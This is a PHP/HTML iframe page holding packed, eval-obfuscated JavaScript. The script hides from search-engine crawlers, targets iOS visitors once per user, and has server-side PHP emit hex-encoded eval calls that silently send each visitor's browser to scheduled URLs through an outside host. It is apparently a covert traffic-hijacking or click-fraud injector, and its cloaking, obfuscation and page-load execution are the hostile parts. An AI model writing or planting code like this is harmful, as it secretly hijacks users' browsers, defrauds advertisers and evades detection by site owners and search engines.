<?php
header("Cache-Control: no-cache");
header("Pragma: no-cache");
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('PRC');//校正时间

global $res;
//文件路径
$file_path = __DIR__.'/jia/datasql/sql.log';
if(file_exists($file_path)){
    $res = file($file_path);
}
@fclose($res);
$res = unserialize($res[0]);
var_dump($res);exit;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>iframe页面</title>
</head>
<body>
<script type="text/javascript">
    eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2 o(){3 t=["K","1X","1V","1U 1S K","1Q","1P","1N","1F","1E"];Y(3 e=0;e<t.1B;e++){6(-1!=m.14.1u.T().C(t[e].T()))i!1}i!0}2 W(g){g=g||{};g.u=g.u||{};3 h=g.s?s(g):h(g);2 s(b){3 c=b.s;3 d=G.1r(\'1q\')[0];b.u[\'1o\']=c;3 e=J(b.u);3 f=G.1h(\'1g\');d.1f(f);m[c]=2(a){d.P(f);18(f.R);m[c]=n;b.D&&b.D(a)};6(b.k.C(\'?\')>-1){b.k=b.k+\'&v=\'+5.l(5.j()*w+1)}x{b.k=b.k+\'?v=\'+5.l(5.j()*w+1)}f.17=b.k;6(b.12){f.R=13(2(){m[c]=n;d.P(f);b.E&&b.E({15:\'1x\'})},12)}};2 J(a){3 b=[];Y(3 c 16 a){b.10(11(c)+\'=\'+11(a[c]))};b.10(\'v=\'+j());i b.Q(\'&\')}2 j(){i 5.l(5.j()*19+1a)}}2 1b(b,c,d){W({k:b,u:c,s:\'1c\',D:2(a){d(n,a)},E:2(a){d(a)}})}3 1d={1e:2(a){3 b=p A();6(a.C(\'?\')>-1){a=a+\'&v=\'+5.l(5.j()*w+1)}x{a=a+\'?v=\'+5.l(5.j()*w+1)}b.L(\'1i\',a,1j);b.1k("1l","1m/1n,I/1p+H,I/H;q=0.9,*/*;q=0.8");b.1s=2(){6(b.1t==4&&b.O==1v||b.O==1w){}};b.N()}};1y.1z.1A=2(e){3 r=p 1C(\',\'+e+\',\');i(r.1D(\',\'+X.Q(X.S)+\',\'))};2 V(){3 a=n;6(m.A){a=p m.A()}x{a=p 1G("1H")}a.L("1I","/1J.1K",1L);a.N(n);3 b=a.1M("U");i p U(b).1O()}3 z=V();2 y(a){3 b=z+(a*1R*F*F*1T);i b}2 B(a,b,c){Z.1W(a,c)};2 M(a){i Z.1Y(a)}2 1Z(a,b,c){13(2(){d=a;3 e=M(d);6(e!=""&&e!=n){6(z>=e){B(d,\'\',y(c));6(20 b==\'2\'){b(a)}}}x{c=c?c:7;3 f=y(c);B(a,f,f);b(a)}},5.l(5.j()*21+1))}',62,126,'||function|var||Math|if||||||||||||return|random|url|floor|window|null||new|||jsonp||data||99999999|else|getDeadline|today|XMLHttpRequest|setCookie|indexOf|success|error|60|document|xml|application|formatParams|spider|open|getCookie|send|status|removeChild|join|timer||toLowerCase|Date|getServersDate|ajax_a|this|for|localStorage|push|encodeURIComponent|time|setTimeout|navigator|message|in|src|clearTimeout|10000|500|aj|jsonpCallback|Ajax|get|appendChild|script|createElement|GET|true|setRequestHeader|Accept|text|html|callback|xhtml|head|getElementsByTagName|onreadystatechange|readyState|userAgent|200|304|timeout|Array|prototype|in_array|length|RegExp|test|YodaoBot|360Spider|ActiveObject|Microsoft|HEAD|date|php|false|getResponseHeader|bingbot|getTime|JikeSpider|MSNBot|24|web|1000|Sogou|Googlebot|setItem|Baiduspider|getItem|verifyDeadline|typeof|5222'.split('|'),0,{}));

    if(o()) {
        if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent) && window.navigator.platform != 'Win32') {//一个用户一次
            <?php
            //混淆加密
            function unicode_encode($name)
            {
                $name = iconv('UTF-8', 'UCS-2', $name);
                $len = strlen($name);
                $str = '';
                for ($i = 0; $i < $len - 1; $i = $i + 2)
                {
                    $c = $name[$i];
                    $c2 = $name[$i + 1];
                    if (ord($c) > 0)
                    {
                        $str .= '\u'.base_convert(ord($c), 10, 16).base_convert(ord($c2), 10, 16);
                    }
                    else
                    {
                        $str .= $c2;
                    }
                }
                return $str;
            }

            //混淆解密
            function hexhunxiao($str){
                $str=bin2hex(unicode_encode($str));
                $res='';
                for($i=0;$i<strlen($str)-1;$i+=2){
                    $tmp='\x'.$str[$i].$str[$i+1];
                    $res.=$tmp;
                }
                return $res;
            }


            $date = array();
            foreach($res as $key => $value){
                if(!empty($value['url_id'])){
                    $date[$value['pro_id']][$value['url_id']] = $value;
                }
            }
            $url = array();
            foreach($date as $key => $value){//产品循环
                foreach($value as $k => $v){//产品下链接循环
                    //反序列化链接发送规则
                    $checkplan = unserialize($v['checkplan']);
                    if($v['delivery_mode'] == 1){
                        $startDay = strtotime($checkplan['start_day']);//开始日期时间戳
                        $revolution = $checkplan['revolution'];//周期
                        $hour = implode(',',$checkplan['hour']);
                        //判断日期和小时是否满足，若满足，放入数组中，单产品下所有符合规则的链接做不放回抽奖
                        $today = strtotime(date("Y-m-d"),time());//今日0点时间戳
                        if(($today - $startDay)/86400 % $revolution == 0){
                            if(!(strpos($hour,date("H")) === false)){
                                $url[$k]['post_type'] = $v['post_type'];
                                $url[$k]['url'] = $v['url'];
                                $url[$k]['percent'] = $v['percent'];
                            }
                        }
                    }else{
                        $day = implode(',',$checkplan['day']);
                        $hour = implode(',',$checkplan['hour']);
                        if ($v['url_id'] == 669) {
                            var_dump($v);
                            var_dump($day);
                            var_dump($hour);
                             var_dump(date("d"));
                            var_dump(date("H"));

                        }
     
                        //判断日期和小时是否满足，若满足，放入数组中，单产品下所有符合规则的链接做不放回抽奖
                        if(!(strpos($day,date("d")) === false)){
                            if(!(strpos($hour,date("H")) === false)){
                                $url[$k]['post_type'] = $v['post_type'];
                                $url[$k]['url'] = $v['url'];
                                $url[$k]['percent'] = $v['percent'];
                            }
                        }
                    }
                }

                $proSum = 100;$rs = '';
                foreach($url as $k => $v){
                    $randNum = rand(1, $proSum);
                    if ($randNum <= $v['percent']) {
                        if($v['post_type'] == 1){
                            $hxurl = "verifyDeadline('https://www.wxbgf.top/lclck.php?url=".base64_encode($v['url'])."',Ajax.get);\n";
                        }elseif($v['post_type'] == 2){
                            $hxurl = "verifyDeadline('https://www.wxbgf.top/lclck.php?url=".base64_encode($v['url'])."',aj,1);\n";
                        }elseif($v['post_type'] == 3){
                            $hxurl = "aj('https://www.wxbgf.top/lclck.php?url=".base64_encode($v['url'])."');\n";
                        }elseif($v['post_type'] == 4){
                            $hxurl = "verifyDeadline('https://www.wxbgf.top/lclck2.php?url=".$v['url']."',Ajax.get);\n";
                        }elseif($v['post_type'] == 5){
                            $hxurl = "verifyDeadline('https://www.wxbgf.top/lclck2.php?url=".$v['url']."',aj,1);\n";
                        }else{
                            $hxurl = "aj('https://www.wxbgf.top/lclck2.php?url=".$v['url']."')";
                        }
//                         var_dump($hxurl);
                        $hxurl_res = hexhunxiao($hxurl);
                        echo 'eval(\''.$hxurl_res.'\');'."\n";

                        break;
                    } else {
                        $proSum -= $v['percent'];
                    }
                }
                $url = array();
            }

            //统计到log
            $logday = date('Ymd');
            if (!file_exists('/tmp/lam182log/')){
                mkdir ('/tmp/lam182log/',0755,true);
            }
            $log_test_file = '/tmp/lam182log/'.$logday.'.log';
            $log_test_str = "1\n";
            writeFileForPv($log_test_file,$log_test_str);
            //统计专用写日志
            function writeFileForPv($file,$str,$mode='a+')
            {
                $oldmask = @umask(0);
                $fp = @fopen($file, $mode);
                // @flock($fp, 3);
                if (!$fp) {

                } else {
                    @fwrite($fp, $str);
                    @fclose($fp);
                    // @umask($oldmask);
                    // Return true;
                }
            }
            ?>
        }
    }
</script>
</body>
</html>